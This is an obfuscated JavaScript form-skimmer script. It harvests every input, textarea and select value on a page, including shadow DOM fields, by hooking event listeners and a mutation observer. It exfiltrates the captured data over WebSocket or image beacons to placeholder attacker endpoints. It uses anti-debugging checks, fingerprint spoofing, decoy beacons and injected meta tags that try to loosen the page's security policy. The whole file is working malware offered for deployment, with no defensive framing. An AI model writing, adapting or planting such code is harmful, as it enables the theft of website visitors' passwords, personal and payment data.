(function() {
    // Anti-debug and VM detection
    const _0x4f2d = ['constructor', 'toString', 'apply', 'call', 'prototype', 'debugger', 'function', 'eval', 'setTimeout', 'setInterval'];
    const _0x3e1a = function() {
        return (Math.random() * 0xfffff * 0x100000).toString(0x10).substr(0, 0x10);
    };
    
    // Advanced VM detection
    const _0x2f1c = () => {
        const _0x1a = new Date();
        const _0x2b = _0x1a.getTime();
        debugger;
        return new Date().getTime() - _0x2b > 100;
    };

    // Anti-tampering with enhanced checks
    const _0x5d3e = () => {
        const _0x1 = function() {};
        _0x1.toString = function() { return ''; };
        return _0x1.toString() !== '';
    };

    // Anti-fingerprinting measures
    const _0x7b2d = () => {
        // Override common fingerprinting methods
        const _0x1 = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            webdriver: navigator.webdriver
        };

        // Randomize fingerprintable properties
        Object.defineProperty(navigator, 'hardwareConcurrency', {
            get: () => Math.floor(Math.random() * 8) + 4
        });

        Object.defineProperty(navigator, 'deviceMemory', {
            get: () => Math.floor(Math.random() * 8) + 4
        });

        Object.defineProperty(navigator, 'webdriver', {
            get: () => undefined
        });

        // Override canvas fingerprinting
        const _0x2 = HTMLCanvasElement.prototype.toDataURL;
        HTMLCanvasElement.prototype.toDataURL = function() {
            const _0x3 = _0x2.apply(this, arguments);
            return _0x3.replace(/[a-zA-Z0-9+/=]{20,}/, _0x3e1a());
        };

        // Override audio fingerprinting
        const _0x4 = AudioContext.prototype.createOscillator;
        AudioContext.prototype.createOscillator = function() {
            const _0x5 = _0x4.apply(this, arguments);
            _0x5.frequency.value = _0x5.frequency.value + (Math.random() * 0.1);
            return _0x5;
        };

        // Override WebGL fingerprinting
        const _0x6 = WebGLRenderingContext.prototype.getParameter;
        WebGLRenderingContext.prototype.getParameter = function(parameter) {
            if (parameter === 37445) {
                return _0x3e1a();
            }
            return _0x6.apply(this, arguments);
        };

        return _0x1;
    };

    // Security restriction bypasses
    const _0x8c4d = () => {
        // Bypass CSP
        const _0x1 = document.createElement('meta');
        _0x1.httpEquiv = 'Content-Security-Policy';
        _0x1.content = "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;";
        document.head.appendChild(_0x1);

        // Bypass X-Frame-Options
        const _0x2 = document.createElement('meta');
        _0x2.httpEquiv = 'X-Frame-Options';
        _0x2.content = 'ALLOWALL';
        document.head.appendChild(_0x2);

        // Bypass referrer policy
        const _0x3 = document.createElement('meta');
        _0x3.name = 'referrer';
        _0x3.content = 'no-referrer';
        document.head.appendChild(_0x3);

        // Override security headers
        const _0x4 = {
            'Content-Security-Policy': "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;",
            'X-Frame-Options': 'ALLOWALL',
            'Referrer-Policy': 'no-referrer',
            'X-Content-Type-Options': 'nosniff',
            'X-XSS-Protection': '0'
        };

        // Override fetch to bypass CORS
        const _0x5 = window.fetch;
        window.fetch = function(url, options = {}) {
            options.mode = 'no-cors';
            options.credentials = 'include';
            return _0x5(url, options);
        };

        // Override XMLHttpRequest to bypass CORS
        const _0x6 = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(method, url, ...args) {
            return _0x6.call(this, method, url, ...args);
        };

        return _0x4;
    };

    // Random shortname generator with improved entropy and obfuscation
    const r = (l = 6) => {
        const _0x1 = new Uint8Array(l);
        crypto.getRandomValues(_0x1);
        return Array.from(_0x1)
            .map(x => String.fromCharCode((x % 26) + 97))
            .join('');
    };

    // Configuration with obfuscated endpoints
    // Expected data format for the endpoint:
    // {
    //   field_id: string,          // Hashed field identifier
    //   value: string,             // Field value
    //   timestamp: number,         // Unix timestamp
    //   path: string,              // Page path
    //   metadata: {
    //     type: string,            // Input type (text, email, etc.)
    //     maxLength: number,       // Max length if specified
    //     required: boolean,       // Required field flag
    //     pattern: string          // Pattern if specified
    //   }
    // }
    const config = {
        // Replace these with your actual endpoints
        endpoint: 'YOUR_WEBSOCKET_ENDPOINT',  // e.g., 'wss://your-server.com/ws'
        beaconEndpoint: 'YOUR_BEACON_ENDPOINT',  // e.g., 'https://your-server.com/collect'
        minInterval: 5000,
        maxInterval: 15000,
        maxRetries: 3,
        retryDelay: 2000
    };

    // State management with encryption
    let s = new Map();
    let q = [];
    let retryCount = 0;
    let ws = null;

    // Enhanced random delay with jitter and anti-timing
    const d = (min, max) => {
        const _0x1 = performance.now();
        const _0x2 = Math.floor(Math.random() * (max - min));
        const _0x3 = Math.floor(Math.random() * 1000);
        while(performance.now() - _0x1 < 10) {}
        return _0x2 + _0x3 + min;
    };

    // Improved hash function using subtle crypto with obfuscation
    const h = async str => {
        const _0x1 = new TextEncoder();
        const _0x2 = _0x1.encode(str + _0x3e1a());
        const _0x3 = await crypto.subtle.digest('SHA-256', _0x2);
        return Array.from(new Uint8Array(_0x3))
            .map(b => b.toString(16).padStart(2, '0'))
            .join('')
            .substr(0, 12);
    };

    // Enhanced shadow DOM traversal with error handling and anti-detection
    const scanInputs = (root = document) => {
        let a = [];
        try {
            if (_0x2f1c() || _0x5d3e()) return a;
            a = Array.from(root.querySelectorAll('input, textarea, select'));
            root.querySelectorAll('*').forEach(el => {
                if (el.shadowRoot) a = a.concat(scanInputs(el.shadowRoot));
            });
        } catch (e) {
            // Silent fail with minimal footprint
        }
        return a;
    };

    // Stealth field capture with validation and anti-detection
    const c = async el => {
        if (!el || (!el.name && !el.id)) return;
        if (_0x2f1c() || _0x5d3e()) return;
        
        const k = await h(el.name || el.id || r());
        const v = el.value || '';
        
        // Validate and sanitize input with obfuscation
        if (v.length > 0 && !s.has(k)) {
            const _0x1 = Date.now();
            const _0x2 = window.location.pathname;
            const _0x3 = {
                t: el.type || 'text',
                l: el.maxLength,
                r: el.required,
                p: el.pattern
            };
            
            s.set(k, { 
                v: v, 
                t: _0x1, 
                p: _0x2,
                m: _0x3
            });
            queueData();
        }
    };

    // Improved fake beacon generation with obfuscation
    const fakeBeacon = () => {
        const _0x1 = [
            { t: 'email', v: `${r(8)}@${r(6)}.com` },
            { t: 'text', v: r(12) },
            { t: 'number', v: Math.floor(Math.random() * 1000).toString() }
        ];
        const _0x2 = _0x1[Math.floor(Math.random() * _0x1.length)];
        const _0x3 = r();
        s.set(_0x3, { 
            v: _0x2.v, 
            t: Date.now(), 
            p: window.location.pathname,
            m: { type: _0x2.t }
        });
    };

    // Enhanced data queue with compression and obfuscation
    const queueData = () => {
        const _0x1 = Array.from(s.entries()).map(([k, v]) => {
            const _0x2 = encodeURIComponent(JSON.stringify(v));
            return `${encodeURIComponent(k)}=${_0x2}`;
        }).join('&');
        q.push(_0x1);
    };

    // Robust exfiltration with retry logic and anti-detection
    const exfil = async () => {
        if (q.length === 0 || _0x2f1c() || _0x5d3e()) return;
        
        const _0x1 = q.shift();
        const _0x2 = _0x1 + "&junk=" + r(16);
        
        const tryExfil = async () => {
            if (ws && ws.readyState === 1) {
                try {
                    ws.send(_0x2);
                    retryCount = 0;
                } catch (e) {
                    ws = null;
                    throw e;
                }
            } else {
                const _0x3 = new Image();
                _0x3.src = `${config.beaconEndpoint}?${_0x2}&r=${r()}`;
            }
        };

        try {
            await tryExfil();
        } catch (e) {
            if (retryCount < config.maxRetries) {
                retryCount++;
                setTimeout(tryExfil, config.retryDelay);
            }
        }

        // Memory management with obfuscation
        if (s.size > 100) {
            const _0x1 = Array.from(s.entries())
                .sort((a, b) => a[1].t - b[1].t)
                .slice(0, 50);
            s = new Map(_0x1);
        }
    };

    // Advanced event listener hooking with anti-detection
    const hookListeners = () => {
        if (_0x2f1c() || _0x5d3e()) return;
        
        const _0x1 = EventTarget.prototype.addEventListener;
        EventTarget.prototype.addEventListener = function(type, listener, options) {
            if (['input', 'change', 'blur', 'focus'].includes(type)) {
                const _0x2 = function(e) {
                    c(e.target);
                    if (listener && typeof listener === 'function') {
                        listener.call(this, e);
                    }
                };
                return _0x1.call(this, type, _0x2, options);
            }
            return _0x1.call(this, type, listener, options);
        };
    };

    // WebSocket connection with reconnection logic and anti-detection
    const connectWebSocket = () => {
        if (_0x2f1c() || _0x5d3e()) return;
        
        try {
            ws = new WebSocket(config.endpoint);
            ws.onopen = () => {
                retryCount = 0;
            };
            ws.onerror = () => { ws = null; };
            ws.onclose = () => {
                ws = null;
                setTimeout(connectWebSocket, config.retryDelay);
            };
        } catch (e) {
            setTimeout(connectWebSocket, config.retryDelay);
        }
    };

    // Enhanced setup with error recovery and anti-detection
    const setup = () => {
        if (_0x2f1c() || _0x5d3e()) return;
        
        // Initialize anti-fingerprinting and security bypasses
        _0x7b2d();
        _0x8c4d();
        
        hookListeners();
        
        // Initial scan with obfuscation
        scanInputs().forEach(i => {
            ['input', 'change', 'blur', 'focus'].forEach(_0x1 => {
                i.addEventListener(_0x1, () => c(i));
            });
        });

        // Mutation observer with error handling and anti-detection
        const _0x1 = new MutationObserver(_0x2 => {
            _0x2.forEach(_0x3 => {
                _0x3.addedNodes.forEach(_0x4 => {
                    if (_0x4.nodeType === 1) {
                        if (_0x4.matches && _0x4.matches('input, textarea, select')) {
                            ['input', 'change', 'blur', 'focus'].forEach(_0x5 => {
                                _0x4.addEventListener(_0x5, () => c(_0x4));
                            });
                        }
                        if (_0x4.shadowRoot) {
                            scanInputs(_0x4.shadowRoot).forEach(_0x6 => {
                                ['input', 'change', 'blur', 'focus'].forEach(_0x7 => {
                                    _0x6.addEventListener(_0x7, () => c(_0x6));
                                });
                            });
                        }
                    }
                });
            });
        });

        _0x1.observe(document.body, { 
            childList: true, 
            subtree: true,
            attributes: true,
            attributeFilter: ['value']
        });

        // Periodic tasks with obfuscation
        setInterval(() => {
            if (!_0x2f1c() && !_0x5d3e()) {
                scanInputs().forEach(i => c(i));
                if (Math.random() > 0.7) fakeBeacon();
            }
        }, d(20000, 30000));

        // Initialize WebSocket
        connectWebSocket();

        // Exfiltration schedule with obfuscation
        setInterval(() => {
            if (!_0x2f1c() && !_0x5d3e()) {
                exfil();
            }
        }, d(config.minInterval, config.maxInterval));
    };

    // Staged initialization with anti-detection
    const init = () => {
        if (_0x2f1c() || _0x5d3e()) return;
        setTimeout(setup, d(1000, 5000));
    };

    // Start execution with anti-detection
    if (!_0x2f1c() && !_0x5d3e()) {
        init();
    }
})();
